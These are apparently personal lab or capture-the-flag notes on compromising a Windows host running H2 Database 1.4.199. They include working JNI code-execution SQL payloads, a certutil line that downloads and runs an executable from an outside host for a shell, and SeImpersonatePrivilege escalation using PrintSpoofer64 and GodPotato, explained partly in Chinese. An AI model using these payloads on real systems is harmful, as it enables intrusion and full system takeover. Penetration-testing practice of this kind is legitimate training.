
from nmap find 8082 running H2, 
use default cred login, find version 1.4.199
search exploit, find # H2 Database 1.4.199 - JNI Code Execution

```
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```

```
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -f -urlcache -split \"http://192.168.49.60:8082/WebIIS.exe\" \"C:\\Windows\\Temp\\WebIIS.exe\"").getInputStream()).useDelimiter("\\Z").next()');
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\Temp\\WebIIS.exe").getInputStream()).useDelimiter("\\Z").next()');
```


```
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -f -urlcache -split \"http://192.168.49.60:8082/WebIIS.exe\" \"C:\\Windows\\Temp\\WebIIS.exe\" && C:\\Windows\\Temp\\WebIIS.exe").getInputStream()).useDelimiter(\"\\Z\").next()');
```

need httpserver and nc , alsp uplad nc.exe and winpeas.exe to C:\\Windows\\Temp\\

get a shell 

```
C:\Users>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\Users>%SystemRoot%\System32\whoami.exe
%SystemRoot%\System32\whoami.exe
jacko\tony

C:\Users>C:\Windows\System32\whoami.exe
C:\Windows\System32\whoami.exe
jacko\tony
```

use full path,  if can not find cmd
or [[Windows PATH]]
```
set PATH=%PATH%;C:\Windows\System32
```
```
set PATH=%PATH%;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
```


find [[SeImpersonatePrivilege]]```
SeImpersonatePrivilege, 
[[PrintSpoofer64]]
[[GodPotato]]
###   
为什么 PrintSpoofer64 和 GodPotato 利用 `SeImpersonatePrivilege`？

- **PrintSpoofer64** 和 **GodPotato** 都是利用 `SeImpersonatePrivilege` 权限，通过滥用 Windows 服务或 API 中的模拟机制来实现权限提升的漏洞利用工具。
    
- 这两个工具分别针对 Windows **打印后台处理程序（Print Spooler）服务**或 **命名管道（Named Pipe）模拟**机制，这些机制本身需要 `SeImpersonatePrivilege` 才能正常运行。
    

---

### 这两个漏洞利用的原理简述：

1. **PrintSpoofer64：**
    
    - 利用 Windows 打印后台处理程序服务。
    - 打印后台处理程序以 SYSTEM 权限运行，并在内部使用模拟操作。
    - 攻击者通过创建恶意打印任务或打印机对象，诱使打印后台处理程序模拟攻击者进程的权限。
    - 由于攻击者拥有 `SeImpersonatePrivilege`，可以利用该模拟的令牌（Token）提升权限至 SYSTEM。
2. **GodPotato：**
    
    - 利用命名管道的模拟机制。
    - 攻击者创建一个命名管道，等待高权限服务连接。
    - 利用 `SeImpersonatePrivilege` 模拟连接服务的权限令牌。
    - 通过模拟的权限令牌，攻击者能够启动 SYSTEM 权限的进程。

---

### 为什么 `SeImpersonatePrivilege` 至关重要：

- 没有 `SeImpersonatePrivilege`，攻击者无法成功模拟高权限进程的令牌。
- 这两个漏洞利用都依赖于攻击者能够模拟 SYSTEM 级别的令牌，从而实现权限提升。
- 该权限常授予许多服务账户，因而成为本地权限提升的常见滥用目标。

---

### 总结：

- **PrintSpoofer64** 利用打印后台处理程序的模拟机制结合 `SeImpersonatePrivilege` 实现提权。
- **GodPotato** 利用命名管道模拟结合 `SeImpersonatePrivilege` 实现提权。
- 两者都必须依赖 `SeImpersonatePrivilege` 来模拟 SYSTEM 令牌完成权限提升



for which version of godpotato

### Summary to choose GodPotato binary:

| Condition | Use GodPotato Binary | |-----------------|--------------------------| | .NET 4.5 or later installed | GodPotato-NET4.exe | 
| .NET 3.5 installed but no .NET4 | GodPotato-NET35.exe | 
| Neither .NET 3.5 nor .NET 4 | GodPotato-NET2.exe |

```
C:\Windows\System32\reg.exe query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5" /v Install
```
```
C:\Windows\System32\reg.exe query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release
```

```powershell
# Check .NET 4.x
$net4 = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" -Name Release -ErrorAction SilentlyContinue
if ($net4 -and $net4.Release -ge 378389) {
    Write-Output ".NET Framework 4.5 or later is installed"
} else {
    Write-Output ".NET Framework 4.5 or later is NOT installed"
}
```

```powershell

# Check .NET 3.5
$net35 = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5" -Name Install -ErrorAction SilentlyContinue
if ($net35 -and $net35.Install -eq 1) {
    Write-Output ".NET Framework 3.5 is installed"
} else {
    Write-Output ".NET Framework 3.5 is NOT installed"
}
```

```
```
C:\Users>C:\Windows\System32\reg.exe query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release
C:\Windows\System32\reg.exe query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
    Release    REG_DWORD    0x80ea8


C:\Users>
```